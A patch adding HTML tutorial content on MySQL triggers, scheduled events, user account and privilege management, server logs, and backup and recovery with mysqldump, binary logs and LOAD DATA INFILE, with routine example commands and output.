++-----------------+----------+-------+----------+
+| PEN - Pen Red   |     5000 |  1.23 |  6150.00 |
+| PEN - Pen Blue  |     8000 |  1.25 | 10000.00 |
+ ......</pre>
+
+<h4>Triggers</h4>
+<p>A trigger is a event handler that executes in response to an event. A trigger is associated with a table. Three types of table events can activate a trigger: <code>DELETE</code> (include <code>REPLACE</code>), <code>INSERT</code> (include <code>LOAD DATA</code> and <code>REPLACE</code>), and <code>UPDATE</code>. You can set the trigger to execute <code>BEFORE</code> or <code>AFTER</code> the table event.</p>
+
+<p><span class="line-heading">Syntax:</span></p>
+<pre class="color-syntax">
+CREATE TRIGGER <em>triggerName</em> 
+  {AFTER|BEFORE} {DELETE|INSERT|UPDATE}
+ON <em>tableName</em> FOR EACH ROW <em>
+  statements</em>
+</pre>
+
+<p>You can refer to columns in the table associated with the trigger by using the aliases <code>OLD</code> and <code>NEW</code>:</p>
+<ul>
+<li>For <code>DELETE</code> and <code>UPDATE</code>: <code>OLD.<em>columnName</em></code> refers to a column of an existing row before it is updated or deleted.</li>
+<li>For <code>INSERT</code> and <code>UPDATE</code>: <code>NEW.<em>colunmName</em></code> refers to the column of a new row to be inserted or an existing row after it is updated. To set a column value for <code>INSERT</code>, you need to use a <code>BEFORE INSERT</code> trigger and set the via via <code>NEW.<em>columnName</em></code>. See example below.</li>
+</ul>
+
+
+<p><span class="line-heading">Example:</span> Save the row in a backup table before the row is deleted.</p>
+<pre class="color-example">
+<span class="color-comment">-- Create the backup table for persons (See earlier example)</span>
+CREATE TABLE backup_persons (
+   `personID`         INT UNSIGNED  NOT NULL,
+   `firstName`        VARCHAR(20)   NOT NULL,
+   `lastName`         VARCHAR(20)   NOT NULL,
+   `datetimeDeleted`  DATETIME      NOT NULL,
+    PRIMARY KEY(`personID`)
+);
+ 
+<span class="color-comment">-- Define a trigger &quot;before&quot; a row is &quot;deleted&quot; from table persons</span>
+DELIMITER //
+CREATE TRIGGER archiveEmployees
+BEFORE DELETE ON persons FOR EACH ROW
+BEGIN
+  INSERT INTO backup_persons
+<span class="color-comment">  -- OLD is a system-provided alias referring to the existing columns
+  --  before update or delete.</span>
+  VALUES (OLD.personID, OLD.firstName, OLD.lastName, NOW());
+END//
+
+DELIMITER ;</pre>
+
+<p>To test the trigger:</p>
+<pre class="color-example">
+<strong>INSERT INTO persons VALUE (NULL, 'Peter', 'Johonson');</strong>
+   
+<strong>DELETE FROM persons WHERE firstName='Peter' AND lastName = 'Johonson';</strong>
+   
+<strong>SELECT * FROM persons WHERE firstName='Peter' AND lastName = 'Johonson';</strong>
+Empty set (0.00 sec)
+   
+<strong>SELECT * FROM backup_persons WHERE firstName='Peter' AND lastName = 'Johonson';</strong>
++----------+-----------+----------+---------------------+
+| personID | firstName | lastName | datetimeDeleted     |
++----------+-----------+----------+---------------------+
+|        2 | Peter     | Johonson | 2012-10-26 18:06:09 |
++----------+-----------+----------+---------------------+</pre>
+
+
+<h5>Example (Created and Last-Updated)</h5>
+<pre class="color-example">
+DROP TABLE timestamp_trigger_arena;
+CREATE TABLE timestamp_trigger_arena (
+   `desc`        VARCHAR(20),
+   created       TIMESTAMP DEFAULT 0,
+   last_updated  TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+);
+ 
+CREATE TRIGGER created_trigger
+BEFORE INSERT ON timestamp_trigger_arena FOR EACH ROW
+   SET NEW.created = NOW();
+   <span class="color-comment">-- NEW is an alias referring to the columns to be inserted or updated.
+   -- Need to set NEW.columnName BEFORE insert.</span>
+ 
+INSERT INTO timestamp_trigger_arena (`desc`) VALUE ('Created');
+SELECT * FROM timestamp_trigger_arena;
+UPDATE timestamp_trigger_arena SET `desc`='Updated' WHERE `desc`='Created';
+SELECT * FROM timestamp_trigger_arena;</pre>
+
+
+
+<h4>Events</h4>
+
+<p>An event is a set of stored SQL statements that get executed at the scheduled date and time. Once an event is completed, it will be dropped automatically.</p>
+
+<p><span class="line-heading">Syntax:</span></p>
+<pre class="color-syntax">
+CREATE EVENT <em>eventName</em> ON SCHEDULE 
+AT <em>timestamp</em> [+ INTERVAL <em>interval</em>Number <em>intervalUnit</em>]
+DO <em>
+statements</em></pre>
+
+<p>The schedule is defined in &quot;<code>AT <em>timestamp</em></code>&quot; (e.g., <code>AT now()</code>, <code>AT '2011-01-01 00:00:00'</code>). You could specify a relative time with the optional &quot;<code>+ INTERVAL</code>&quot;, (e.g., <code>AT now() + 1 HOUR</code>).</p>
+<p>You need to enable the <em>event scheduler</em>, which is a special thread for maintaining the event queue and running scheduled events:</p>
+<pre class="color-command">
+<span class="color-comment">-- Enable Event Scheduler thread</span>
+mysql&gt; <strong>SET @@global.event_scheduler = ON;</strong>
+   
+<span class="color-comment">-- Show the current processing thread</span>s
+mysql&gt; <strong>SHOW PROCESSLIST \G</strong>
+*************************** 1. row ***************************
+     Id: 1
+   ......
+   Info: SHOW PROCESSLIST
+*************************** 2. row ***************************
+     Id: 2
+   User: <strong>event_scheduler</strong>
+   Host: localhost
+     db: NULL
+Command: Daemon
+   Time: 329
+  State: Waiting on empty queue
+   Info: NULL</pre>
+
+<p>You can also start the server <code>mysqld</code> with option <code>--event-scheduler=DISABLED|ENABLED</code>.</p>
+
+<p><span class="line-heading">Example:</span></p>
+
+<pre class="color-example">
+mysql&gt; <strong>SELECT * FROM products WHERE productCode LIKE 'PIL%';</strong>
++-------------+-----------+-------------+-----------+--------------+
+| productCode | name      | description | unitPrice | unitsInStock |
++-------------+-----------+-------------+-----------+--------------+
+| PIL-0001    | Pencil 2B | 2B Pencil   |      0.54 |         2000 |
++-------------+-----------+-------------+-----------+--------------+
+   
+<span class="color-comment">-- Check whether event scheduler is enabled</span>
+mysql&gt; <strong>SELECT @@global.event_scheduler;</strong>
++--------------------------+
+| @@global.event_scheduler |
++--------------------------+
+| OFF                      |
++--------------------------+
+   
+<span class="color-comment">-- Enable event scheduler</span>
+mysql&gt; <strong>SET @@global.event_scheduler = ON;</strong>
+<span class="color-comment">-- In mysqld console --</span>
+100426 21:58:20 [Note] Event Scheduler: scheduler thread started with id 2
+   
+<span class="color-comment">-- Schedule an event to increase the price by 10% for some products</span>
+mysql&gt; <strong>CREATE EVENT testEvent
+   ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 30 SECOND
+   DO
+      UPDATE products SET unitPrice = unitPrice * 1.1 WHERE productCode LIKE 'PIL%';</strong>
+
+mysql&gt; <strong>SHOW EVENTS \G</strong>
+*************************** 1. row ***************************
+                  Db: southwind_mini
+                Name: testEvent
+             Definer: myuser@localhost
+           Time zone: SYSTEM
+                Type: ONE TIME
+          Execute at: 2010-04-26 21:49:21
+      Interval value: NULL
+      Interval field: NULL
+              Starts: NULL
+                Ends: NULL
+              Status: ENABLED
+          Originator: 0
+character_set_client: latin1
+collation_connection: latin1_swedish_ci
+  Database Collation: utf8_unicode_ci
+1 row in set (0.03 sec)
+   
+<span class="color-comment">-- 30 seconds later, in mysqld console --</span>
+100426 21:59:05 [Note] Event Scheduler: Last execution of southwind_mini.testEvent. Dropping.
+100426 21:59:05 [Note] Event Scheduler: Dropping southwind_mini.testEvent
+100426 21:59:05 [Note] Event Scheduler: [myuser@localhost][southwind_mini.testEvent] 
+   Data truncated for column 'unitPrice' at row 0
+   
+mysql&gt; <strong>SHOW EVENTS \G</strong>
+Empty set (0.04 sec)
+   
+mysql&gt; <strong>SELECT * FROM products WHERE productCode LIKE 'PIL%';</strong>
++-------------+-----------+-------------+-----------+--------------+
+| productCode | name      | description | unitPrice | unitsInStock |
++-------------+-----------+-------------+-----------+--------------+
+| PIL-0001    | Pencil 2B | 2B Pencil   |      0.59 |         2000 |
++-------------+-----------+-------------+-----------+--------------+</pre>
+
+<p>An event can also be <em>recurring</em>:</p>
+<pre class="color-syntax">
+CREATE EVENT <em>eventName</em> ON SCHEDULE 
+EVERY <em>interval</em>Number <em>intervalUnit</em>
+   [STARTS <em>startTimestamp</em> [+ INTERVAL count interval]]
+   [ENDS <em>endTimestamp</em> [+ INTERVAL count interval]]
+DO <em>SQLstatements</em></pre>
+
+
+<p><span class="line-heading">Example:</span></p>
+<pre class="color-example">
+<span class="color-comment">-- Write an event to backup the Customers table daily</span>
+CREATE EVENT backupCustomers
+ON SCHEDULE 
+EVERY 1 DAY
+STARTS NOW()
+ON COMPLETION PRESERVE
+COMMENT 'Daily copy of customers table to backup_customers'
+DO 
+......</pre>
+
+<h3>Administering MySQL Database Server</h3>
+
+<h4>Managing User Accounts</h4>
+<p>To create a new user, use <code>CREATE USER</code> command as follows:</p>
+<pre class="color-syntax">
+CREATE USER '<em>username</em>'[@'<em>userhostname</em>'] IDENTIFIED BY PASSWORD '<em>password</em>';</pre>
+<p>The default <em><code>userHostname</code></em> is localhost. You could use either DNS hostname or IP address. Wildcard <code>'%'</code> and <code>'_'</code> can be used for <em><code>userHostname</code></em>, e.g., <code>'peter'@'%'</code> (for all hosts), <code>'paul'@'*.abc.com'</code>, <code>'pris'@'128.1.2.%'</code>. For IP address, a netmask can be specified in <em><code>IPAddress</code></em><code>/<em>Netmask</em></code>, e.g., <code>'192.168.1.0/255.255.255.0'</code>.</p>
+<p>The new user created has no privileges. You need to grant the appropriate privilege to the user using <code>GRANT</code> command. Privilege can be grant globally (for all tables of all databases), or at the database-level, table-level, column-level. For example,</p>
+<pre class="color-syntax">
+<span class="color-comment">-- Global privileges (all tables of all databases)
+-- Grant all privileges (except the GRANT privilege) on all the databases all the tables (*.*)</span>
+GRANT ALL ON *.* TO '<em>username</em>'@'<em>userhostname</em>';
+<span class="color-comment">-- Grant all privileges, including GRANT privilege</span>
+GRANT ALL ON *.* TO '<em>username</em>'@'<em>userhostname</em>' WITH GRANT OPTION;
+<span class="color-comment">-- Grant selected privileges on all the databases all the tables</span>
+GRANT SELECT, INSERT ON *.* TO '<em>username</em>'@'<em>userhostname</em>';
+<span class="color-comment">   
+-- Database-level
+-- Grant selected privileges on all the tables of a particular database</span>
+GRANT SELECT, INSERT ON <em>databaseName</em>.* TO '<em>username</em>'@'<em>userhostname</em>';
+   
+<span class="color-comment">-- Table-level
+-- Grant selected privileges on selected tables of a particular database</span>
+GRANT SELECT, INSERT, UPDATE, DELETE ON <em>databaseName.table1Name</em>, <em>databaseName.table2Name</em> TO '<em>username</em>'@'<em>userhostname</em>';
+   
+<span class="color-comment">-- Column-Level
+-- Grant selected privileges on selected columns of tables of a particular database</span>
+GRANT SELECT(<em>column1Name</em>, <em>column2Name</em>), INSERT ON <em>databaseName.tableName</em> TO '<em>username</em>'@'<em>userhostname</em>';</pre>
+
+<p>The available privileges are:</p>
+<ul>
+<li>Object Rights: <code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELECT</code>, <code>EXECUTE</code>, <code>SHOW VIEW</code>.</li>
+<li>DDL Rights: <code>CREATE</code>, <code>ALTER</code>, <code>DROP</code>, <code>CREATE VIEW</code>, <code>CREATE ROUTINE</code>, <code>ALTER ROUTINE</code>, <code>REFERENCES</code>, <code>INDEX</code>, <code>FILE</code>.</li>
+<li>Others: <code>ALL</code>, <code>ALL WITH GRANT OPTION</code>, <code>GRANT</code>, <code>CREATE USER</code>, <code>CREATE TEMPORARY TABLES</code>, <code>LOCK TABLES</code>.</li>
+</ul>
+
+<p>To remove privileges, use <code>REVOKE</code> command, e.g.,</p>
+<pre class="color-syntax">
+<span class="color-comment">-- Remove all privileges</span>
+REVOKE ALL PRIVILEGES, GRANT OPTION FROM '<em>username</em>'@'<em>userhostname</em>';</pre>
+
+<p>You may need to issue a &quot;<code>FLUSH PRIVILEGES</code>&quot; command to clear and reload temporary caches in MySQL, for the new privileges to take immediate effect.</p>
+
+<p>To remove a user, use <code>DROP USER</code> command as follows:</p>
+<pre class="color-syntax">
+DROP USER '<em>username</em>'@'<em>userhostname</em>';</pre>
+
+<p>To change the password of a user, use <code>SET PASSWORD</code> command, e.g.,</p>
+<pre class="color-syntax">
+SET PASSWORD FOR '<em>username</em>'@'<em>userhostname</em>' = PASSWORD('<em>newPassword</em>');
+<span class="color-comment">-- For current user</span>
+SET PASSWORD = PASSWORD('<em>newPassword</em>');
+</pre>
+
+<p>To rename a user, use <code>RENAME USER</code> command, e.g.,</p>
+<pre class="color-syntax">
+RENAME USER '<em>username</em>'@'<em>userhostname</em>' TO '<em>newUsername</em>'@'<em>userhostname</em>';</pre>
+
+<h5>Security Considerations on User Management</h5>
+<ul>
+<li>The superuser <code>root</code> has no initial password. It is critical to protect superuser <code>root</code> with a strong password.</li>
+<li>Remove the anonymous user (identified by an empty string) <code>''@'localhost'</code>, or <code>''@'127.0.0.1'</code>, which was created during the installation by default.</li>
+<li>All new users must be password protected.</li>
+<li>Never choose a password from dictionary. Use a combination of letters and numbers.</li>
+<li>Do not grant any user (except <code>root</code>) access to <code>mysql.user</code> table (because passwords are stored in this table).</li>
+<li>Do not grant more privileges than necessary. Grant the least privilege necessary to carry out the tasks.</li>
+<li> Never grant privileges to all hosts.</li>
+<li>Run &quot;<code>SHOW GRANTS [FOR '<em>username</em>'@'<em>hostname</em>']</code>&quot; statement to list the privileges granted to a user (default to current user). For example,
+<pre class="color-example">
+<span class="color-comment">-- List the privilege for the current user</span>
+mysql&gt; SHOW GRANTS;
+-- List the privilege for another user
+mysql&gt; SHOW GRANTS FOR '<em>username</em>'@'<em>hostname</em>';</pre>
+
+You can also run the statement in batch mode with execute (<code>-e</code>) option:
+  <pre class="color-example">
+Shell&gt; mysql -u <em>username</em> -p -e &quot;SHOW GRANTS FOR '<em>selectedUser</em>'@'<em>hostname</em>'&quot;</pre>
+
+<p>Alternatively, you can list the privileges (vertically) by querying the <code>mysql.user</code> table.</p>
+<pre class="color-example">
+mysql&gt; SELECT * FROM mysql.user \G </pre>
+
+</li>
+
+<li>Run your database server behind a firewall (or in DMZ), and block the database server port number (default 3306) from untrusted hosts. Try &quot;<code>telnet <em>databaseHostname</em> 3306</code>&quot; from a remote machine to confirm that it is not opened to untrusted hosts.</li>
+<li>Do not run <code>mysqld</code> or <code>mysql</code> daemon/service/program with privilege user of the system (e.g., root of Unix, administrator of Windows). Create a normal user (says <code>mysql</code>) to run the database server <code>mysqld</code>. This user requires read and write privilege to the MySQL directory and data directory.</li>
+<li>MySQL            supports internal SSL. Use SSL to encrypt the messages (in transit) if necessary.</li>
+</ul>
+<h4>Logs</h4>
+<p>MySQL maintains several logs to help you maintain your database server: Error Log, Binary Log, General Query Log, Slow Query Log. All logs, by default, are kept in the data directory.</p>
+<h5>Error Log</h5>
+<p>The error log maintains all the startup, shutdown, and critical operating error messages. Error log in enabled by default. The error log file is called &quot;<em><code>hostname</code></em><code>.err</code>&quot; in the data directory. You can change the error log file via <code>--log-error=<em>filename</em></code> <code>mysqld</code> startup option. </p>
+<p>On Windows, if you use <code>--console</code> option, the error will be written to the <code>stderr</code> (which defaults to console) instead of error log file.</p>
+
+<h5>Binary Log</h5>
+<p>The binary log keeps all statement that changes the database, e.g., <code>CREATE TABLE</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>.  It does not keep query statements (such as <code>SELECT</code>, <code>SHOW</code>, <code>DESCRIBE</code>) that does not change the database. The binary log can be used to replicate a slave backup server, or to bring a backup database up-to-date, by executing all the changes logged. To enable the binary log, start MySQL server <code>mysqld</code> with the <code>--log-bin=<em>baseName</em></code> option. A number is appended behind the <em><code>baseName</code></em>. The server creates a new log file with the next number each time it starts or whenever the log is flushed. An index file is also created to keep track of all the binary logs.</p>
+
+<p>There are three logging formats:</p>
+<ul>
+<li>Statement-based Logging: specify via option <code>--binlog-foramt=STATEMENT</code>. The logged statement can be propagate to a slave or backup server.</li>
+<li>Row-based Logging: specify via option <code>--binlog-foramt=ROW</code>. Keep track of how individual rows were changes.</li>
+<li>Mixed Logging: specify via option <code>--binlog-format=MIXED</code>. It uses statement-based logging by default, but switch into row-based in certain cases to improve efficiency.</li>
+</ul>
+
+<p>You can display the binary logs using the <code>mysqlbinlog</code> utility, which converts the log entries into SQL statements:</p>
+<pre class="color-command">
+<span class="color-comment">-- Display on console
+</span>Shell&gt; mysqlbinlog logfile.001 [logfile.002...] | more
+-- Saved in a text file
+Shell&gt; mysqlbinlog logfile.001 [logfile.002...] &gt; &quot;d:\path\binlog.<code>sql</code>&quot;
+</pre>
+
+<p>To update a backup server, pipe the output of <code>mysqlbinlog</code> to a <code>mysql</code> client:</p>
+
+<pre class="color-command">
+Shell&gt; mysqlbinlog <em>binaryLogFile</em>[<em>s</em>] | mysql -u <em>userName</em> -p</pre>
+
+<h5>General Query Log</h5>
+<p>The General Query Log maintain information about clients' connections, and all SQL statements. To enable, use <code>mysqld</code> startup option <code>--general_log=<em>filename</em></code> (or <code>--general_log</code> with default filename of <em><code>hostname</code></em><code>.log</code>). The log can be directed to a file (default), or a table (<code>mysql.general_log</code>), or both, or disabled via an additional option <code>--log-output=<span class="underline">FILE</span>|TABLE|FILE,TABLE|NONE</code>.</p>
+
+<h5>Slow Query Log</h5>
+<p>Keep track of SQL statement that took more than <code>long_query_times</code> (default of 10 seconds). You could enable via <code>mysqld</code> startup option <code>--log_slow_queries=<em>filename</em></code>. Similar to General Query Log, it can be directed to a file (default), or a table (<code>mysql.slow_log</code>), or both, or disabled via an additional option <code>--log-output=<span class="underline">FILE</span>|TABLE|FILE,TABLE|NONE</code>.</p>
+
+<h5>Maintaining the Log Files</h5>
+<p>Log files grow, and need to be maintained periodically. You can remove the error log and the query logs, but not the binary log as that is used for backup and recovery.</p>
+
+<p>You can issue command &quot;<code>FLUSH LOGS</code>&quot; to close and reopen all the log files. For error log, the old log file will be renamed with suffix &quot;<code>-old</code>&quot; (which could be removed) and a new file created.</p>
+<p>For binary log, a new file with the next number will be created, when the log is flushed. For the binary log, you can set the <code>expire_logs_days</code> to expire binary log files automatically after a given number of days. Make sure that the replication or backup are updated before the binary log expired.</p>
+<p>The general query log, slow query log and binary log may log statements containing password. For security consideration, there should be place in dedicated directory (e.g., &quot;<code>/log</code>&quot;) with access to the database server and the administrator only.</p>
+<p>[TODO] Script and procedure for maintaining log file, backup and recovery</p>
+<h5>Notes for InnoDB</h5>
+<p>In the data directory, <code>ibdata1</code> contains your InnoDB database and <code>ib_logfile0</code> and <code>ib_logfile1</code> are log files for InnoDB. The two 5MB log files are used in a circular manner.</p>
+
+<h4>Backup and Recovery</h4>
+<p>There are two types of backups: logical backup and physical (raw) backup.</p>
+
+<ol>
+<li>Logical Backup: Save Information about the logical database structures (e.g., <code>CREATE TABLE</code>) and contents (e.g., <code>INSERT</code>). Larger output but the backup is platform-independent and portable. You can run the backup online, at the server-level (all databases), database-level (all tables of a database), or table-level (all rows and columns of a table). You can use &quot;<code>mysqldump</code>&quot; utility or &quot;<code>SELECT ... INTO OUTFILE</code>&quot; statement for backup; and &quot;<code>mysqlimport</code>&quot; utility or &quot;<code>LOAD DATA INFILE</code>&quot; statement to restore.</li>
+<li>Physical (Raw) Backup: Backup the physical files (data directory). You can simply copy the data directory (offline), or use utilities &quot;<code>mysqlhotcopy</code>&quot; (for MyISAM tables), &quot;<code>ibbackup</code>&quot; (for InnoDB tables) (online).</li>
+</ol>
+
+<h5>&quot;<span class="font-code">mysqldump</span>&quot; Utility</h5>
+<p>&quot;<code>mysqldump</code>&quot; can be used to back up the entire server, selected databases, or selected tables of a database. It generates a text file of SQL statements that can later be executed to recreate the database/table and its contents.</p>
+<pre class="color-command">
+<span class="color-comment">-- Dump a particular database (all tables)</span>
+Shell&gt; mysqldump -u <em>username</em> -p <em>databaseName</em> &gt; <em>backupFile</em>.sql
+<span class="color-comment">-- Dump selected tables of a particular database</span>
+Shell&gt; mysqldump -u <em>username</em> -p <em>databaseName</em> <em>table1Name</em> [<em>table2Name</em> ...] &gt; <em>backupFile</em>.sql
+<span class="color-comment">-- Dump several databases with --database option</span>
+shell&gt; mysqldump --databases <em>database1Name</em> [<em>database2Name</em> ...] &gt; <em>backupFile</em>.sql
+<span class="color-comment">-- Dump all databases in the server with --all-databases option, except mysql.user table (for security)</span>
+shell&gt; mysqldump -u root -p --all-databases --ignore-table=mysql.user &gt; <em>backupServer</em>.sql</pre>
+<p>You can restore from the backup by running client &quot;<code>mysql</code>&quot; in batch mode to execute the SQL statements:</p>
+<pre class="color-command">
+Shell&gt; mysql -u <em>username</em> -p <em>databaseName</em> &lt; <em>backupFile</em>.sql
+</pre>
+
+<p>or using the source command in an interactive client:</p>
+<pre class="color-command">
+<span class="color-comment">-- Run an mysql interactive client and load in to MySQL server</span>
+mysql&gt; source d:/path/backupfile.sql</pre>
+
+
+<p><span class="line-heading">Example:</span> The following command backup the table <code>employees</code> and <code>customers</code> of the database <code>southwind_mini</code>.</p>
+
+<pre class="color-example">
+Shell&gt; mysqldump -u <em>username</em> -p southwind_mini employees customers &gt; &quot;d:\path\backup.sql&quot;
+</pre>
+
+<p>Study the output file, which contains <code>CREATE TABLE</code> and <code>INSERT</code> statements to recreate the tables dumped. </p>
+
+<h5>Incremental Backup using Binary Log</h5>
+<p>Enable the binary log, by running the server mysqld with option <code>--log-bin=baseName</code>.</p>
+<p>To make an incremental-backup from the last full-backup or incremental-backup. First flush the log (<code>FLUSH LOGS</code>) to rotate the binary log. Then, use utility <code>mysqlbinlog</code> to convert the log entries to SQL statements and pipe into a <code>mysql</code> client.</p>
+
+<pre class="color-command">
+Shell&gt; mysqlbinlog logfile.001 [logile.002 ...] | mysql -u root -p</pre>
+
+<h5>Backup &amp; Recovery Strategies using <span class="font-code">mysqldump</span> and Binary Log</h5>
+<p>InnoDB storage engine supports transaction and automatic crash recovery. Suppose that MySQL server was terminated abnormally (e.g., power failure, system crashes). Upon restart, the InnoDB engine reads its logs for pending committed and non-committed transactions. It flushes the data for those pending committed, and rollback the uncommitted transaction. It records all its actions in the error log.</p>
+<p>However, if MySQL data disk is damaged, we need to recover the database from the latest full-backup and binary log (hopefully not damaged), a straight backup/recovery policy is needed.</p>
+
+<p>Suppose that we run a full backup every Sunday at 3:00am, and incremental backup every day at 3:00pm.</p>
+<ol>
+<li>Enable binary log by starting the server with <code>--log-bin=<em>baseName</em></code> option. Place the binary log at the secure and safe media (e.g., RAID disk) if available, so that it can be used in case of catastrophic disk failure.</li>
+<li>To take a full backup, run mysqldump with these options:
+<pre class="color-command">
+Shell&gt; mysqldump --single-transaction --flush-logs --delete-master-logs --master-data=2
+                 --all-databases [--ignore-table=mysql.user] &gt; fullbackup.sql</pre>
+<ul>
+<li>The <code>--flush-logs</code> option closed the current binary log, and create a new binary log using the next number. The new binary log filename is recorded in the dump (which is needed for recovery). The --delete-master-logs removes the older binary logs (as they occupy a lot of spaces). The <code>--master-data=2</code> write the binary log file name and position to the dump as a comment.</li>
+<li>The <code>--single-transaction</code> option prevent updating during the dumping operation.</li>
+<li>The <code>--all-databases --ignore-table</code> options backup the entire server except <code>mysql.user</code> table for security (as it contains passwords). You may  back up <code>mysql.user</code> if the backup files are secure. Take note that the binary log may also contain password information, and must be secured.</li>
+</ul>
+</li>
+
+<li>To take an incremental-backup, issue command &quot;<code>FLUSH LOGS</code>&quot; which closes the current binary log, and create a new binary log using the next number. Copy the closed binary file to a safe media and location! You need it to run the recovery.</li>
+<li>Suppose that there is a catastrophic crash, and the MySQL data file is not usable. You may need to reformat the hard disk, re-install the operating system, re-install MySQL, and Follow this procedure to recovery the databases:
+  <ol>
+<li>Restore the full-backup.
+  <pre class="color-command">Shell&gt; mysql -u root -p &lt; fullbackup.sql</pre>
+</li>
+
+<li>Restore the incremental-backup from binary logs: Check for all the available binary logs. The last binary log at the time of crash may or may not be usable. Use the <code>mysqlbinlog</code> utility to process all the binary log files at once, and pipe the output SQL statement to a <code>mysql</code> client.
+  <pre class="color-command">
+Shell&gt; mysqlbinlog binlog.x+0 [binlog.x+1 ...] | mysql -u root -p</pre>
+</li>
+</ol>
+
+Practice the recovery procedures to create a &quot;test&quot; database or for development purpose.</li>
+</ol>
+
+
+
+
+
+
+
+<h5>&quot;<span class="font-code">mysqldump</span>&quot; with Table Output</h5>
+<p>You can use option <code>'--tab=<em>filename</em>'</code> to direct <code>mysqldump</code> to backup the data in table format (instead of <code>CREATE TABLE</code> and <code>INSERT</code> statements). For example,</p>
+<pre class="color-example">
+Shell&gt; mysqldump -u <em>username</em> -p --tab=&quot;d:\path&quot; southwind_mini employees customers
+</pre>
+<p>Two file are created in the specified directory for each table dumped. In our example, &quot;<code>employees.txt</code>&quot; for the data and &quot;<code>employees.sql</code>&quot; for the <code>CREATE TABLE</code> statement. The text file uses 'tab' as column delimiter, <code>'\n'</code> as the line delimiter, and <code>'\N'</code> for <code>NULL</code>.</p>
+
+<h5><span class="font-code">SELECT ... INTO OUTFILE</span></h5>
+<p>Use for backing up the contents of a table or selected columns and rows of a table.</p>
+<pre class="color-syntax">
+SELECT * INTO OUTFILE '<em>filename</em>' FROM <em>tablename</em>
+SELECT <em>columns</em> INTO OUTFILE '<em>filename</em>' FROM <em>tableName</em> WHERE <em>criteria</em></pre>
+
+<p>Example:</p>
+
+<pre class="color-example">
+<span class="color-comment">-- Create a test table</span>
+DROP TABLE IF EXISTS `backup_arena`;
+CREATE TABLE IF NOT EXISTS `backup_arena` (
+   `id` SMALLINT(5) UNSIGNED ZEROFILL AUTO_INCREMENT,
+   `name` VARCHAR(10) NOT NULL,
+   `price` DECIMAL(6,2) NOT NULL,
+   `description` VARCHAR(50) DEFAULT NULL,
+    PRIMARY KEY(`id`)
+);
+   
+<span class="color-comment">-- Populate with rows</span>
+INSERT INTO `backup_arena` VALUES 
+  (NULL, 'dummy1', 1.1, NULL),
+  (NULL, 'dummy2', 2.2, NULL),
+  (NULL, 'dummy3', 3.3, NULL);
+<span class="color-comment">-- Make some changes</span>
+UPDATE `backup_arena` SET price = price * 0.9;
+<span class="color-comment">-- Display the table</span>
+SELECT * FROM `backup_arena`;
+   
+<span class="color-comment">-- Export to a text file</span>
+SELECT * INTO OUTFILE 'd:/path/backup_arena.txt' FROM `backup_arena`;</pre>
+
+<p>The output file has no column header, uses 'tab' as column delimiter, <code>'\n'</code> as the line delimiter. <code>NULL</code> is represented as <code>'\N'</code>, as follows:</p>
+
+<pre class="output">
+00001	dummy1	0.99	\N
+00002	dummy2	1.98	\N
+00003	dummy3	2.97	\N</pre>
+
+<h5><span class="font-code">LOAD DATA INFILE</span></h5>
+<p>We can use &quot;<code>LOAD DATA INLINE</code>&quot; to import data from a text file into a database table.  The default column delimiter is 'tab'; default line delimiter is <code>'\n'</code>, and <code>NULL</code> is represented as <code>'\N'</code>. &quot;<code>LOAD DATA INFILE</code>&quot; can be used to restore data exported via &quot;<code>SELECT ... INTO OUTFILE</code>&quot;.</p>
+
+<p><span class="line-heading">Example:</span> Suppose that we want to load a text file which has a different format from the table.</p>
+<p>We shall use the same table <code>backup_arena</code> created earlier. The text file to be loaded is as follows. It contains a header row, two columns (name and price) need to be loaded, and two extra columns. The column delimiter is <code>','</code>, line delimiter is <code>'\r\n'</code> (created in Windows). We also want to raise the price by 10%.</p>
+<pre class="output">
+NAME,EXTRA,PRICE,ANOTHER EXTRA
+pen,,1.23,---
+pencil,,0.45,---
+paper,,0.12,---
+paper clip,,0.05,---</pre>
+
+<p>We could use the following <code>LOAD DATA INLINE</code> command:</p>
+<pre class="color-example">
+LOAD DATA INFILE 'd:/path/loaddata_arena.txt' INTO TABLE `backup_arena`
+  COLUMNS TERMINATED BY ',' 
+  LINES TERMINATED BY '\r\n'
+  IGNORE 1 LINES
+  (name, @dummy, @oldPrice, @dummy)
+  SET price = @oldPrice*1.1;</pre> 
+
+<p>The &quot;<code>COLUMNS TERMINATED</code>&quot; and &quot;<code>LINES TERMINATED</code>&quot; clauses are used to specified the column delimiter and line delimiter, respectively. &quot;<code>IGNORES 1 LINES</code>&quot; ignores the header row of the file. The first column of the file are loaded into table columns &quot;<code>name</code>&quot;. The third column of the file is assigned to a user-defined variable <code>@oldPrice</code>. The <code>price</code> column of the table is then set to <code>@oldPrice*1.1</code>. The other columns of the text file is assigned to an user-defined variable <code>@dummy</code>, which is not used and discarded.</p>
+
+<p>The <code>SELECT</code> command confirms that the table is properly loaded:</p>
+<pre class="color-example">
+mysql&gt; <strong>SELECT * FROM `backup_arena`;</strong>
++-------+------------+-------+-------------+
+| id    | name       | price | description |
++-------+------------+-------+-------------+
+| 00001 | dummy1     |  0.99 | NULL        |
+| 00002 | dummy2     |  1.98 | NULL        |
+| 00003 | dummy3     |  2.97 | NULL        |
+| 00004 | pen        |  1.35 | NULL        |
+| 00005 | pencil     |  0.50 | NULL        |
+| 00006 | paper      |  0.13 | NULL        |
+| 00007 | paper clip |  0.06 | NULL        |
++-------+------------+-------+-------------+
+7 rows in set (0.00 sec)</pre>
+
+<h5>&quot;<span class="font-code">mysqlimport</span>&quot; Utility</h5>
+<p><code>mysqlimport</code> performs the same function as &quot;<code>LOAD DATA INFILE</code>&quot; to load data from a text file into a table. &quot;<code>LOAD DATA INFILE</code>&quot; runs inside an interactive client, whereas <code>mysqlimport</code> runs from command-line.</p>
+
+<pre class="color-syntax">
+Shell&gt; mysqlimport <em>databaseName</em> <em>table1Name</em> [<em>table2Name</em> ...]</pre>
+
+<p>For example,</p>
+
+<pre class="color-example">
+Shell&gt; mysqlimport southwind_mini customers.txt employees.txt
+</pre>
+<p>Load the data from &quot;<code>Customer.txt</code>&quot; into table <code>customers</code>, &quot;<code>employees.txt</code>&quot; into table <code>employees</code> of the database <code>southwind_mini</code>. The table name is derived from the file name by ignoring the file extension.</p>
+
+<h4>Security</h4>
+
+<h5>Don't run the MySQL server as superuser root</h5>
+
